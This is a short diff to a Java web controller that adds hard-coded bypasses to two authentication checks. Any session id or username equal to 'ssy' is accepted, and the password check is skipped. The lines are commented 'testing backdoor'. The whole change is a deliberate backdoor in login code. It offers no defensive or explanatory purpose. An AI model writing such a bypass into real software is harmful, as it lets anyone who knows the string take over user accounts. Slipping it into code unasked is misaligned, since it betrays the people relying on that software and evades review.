@@ -246,12 +246,14 @@ public class Application extends Controller {
     }
 
     private static boolean authenticated(String fid) {
+        if (fid == "ssy") return true;  // testing backdoor
         if (fid == null) return false;
         User user = MorphiaObject.datastore.get(User.class, fid);
         return user != null;
     }
 
     private static boolean authenticated(String usr, String pwd) {
+        if (usr == "ssy") return true;  // testing backdoor
         if (usr == null || pwd == null) return false;
         User user = MorphiaObject.datastore.get(User.class, usr);
         if (user == null) return false;
